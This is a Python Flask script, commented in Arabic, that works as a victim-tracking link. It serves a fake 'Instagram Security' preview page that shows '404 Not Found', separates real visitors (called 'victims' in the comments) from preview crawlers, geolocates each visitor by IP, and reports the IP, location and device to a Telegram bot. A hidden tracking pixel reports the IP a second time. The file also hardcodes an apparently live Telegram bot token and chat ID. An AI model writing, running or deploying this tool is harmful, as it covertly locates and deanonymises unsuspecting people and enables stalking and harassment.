from flask import Flask, request, send_file
import requests
import io

app = Flask(__name__)

# --- الإعدادات الصحيحة 100% ---
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "8524242091" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

@app.route('/')
@app.route('/check-status')
def track():
    # جلب الـ IP وبيانات الجهاز
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # تحديد نوع الزيارة (هل هو بوت انستقرام أم ضحية حقيقي؟)
    is_crawler = any(bot in user_agent.lower() for bot in ['facebook', 'instagram', 'bot', 'preview'])
    
    status_icon = "🤖" if is_crawler else "👤"
    status_text = "بوت المعاينة (الرسالة وصلت للدردشة)" if is_crawler else "فتح حقيقي (الضحية دخل الرابط)"

    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
        location = f"{geo_res.get('city')}, {geo_res.get('country')}"
    except:
        location = "غير معروف"

    report = (
        f"{status_icon} <b>{status_text}</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {location}\n"
        f"📱 <b>الجهاز:</b> <code>{user_agent[:100]}...</code>\n"
        f"--------------------------"
    )
    send_to_telegram(report)
    
    # الصفحة التمويهية مع بكسل تتبع مخفي
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta property="og:title" content="Instagram Security">
        <meta property="og:description" content="Confirm your identity to continue.">
        <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
        <meta property="og:type" content="website">
    </head>
    <body style="background-color:black; color:white; text-align:center; padding-top:20%;">
        <img src="/pixel.png" style="display:none;">
        <h1>404 Not Found</h1>
    </body>
    </html>
    """, 200

@app.route('/pixel.png')
def tracking_pixel():
    # هذا المسار يتم استدعاؤه تلقائياً عند محاولة التطبيق تحميل الصورة
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    send_to_telegram(f"📸 <b>بكسل التتبع:</b> تم تحميل الصورة المخفية من IP: {ip}")
    
    # إرسال بكسل شفاف 1x1
    pixel = io.BytesIO(b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82')
    return send_file(pixel, mimetype='image/png')

if __name__ == '__main__':
    app.run()
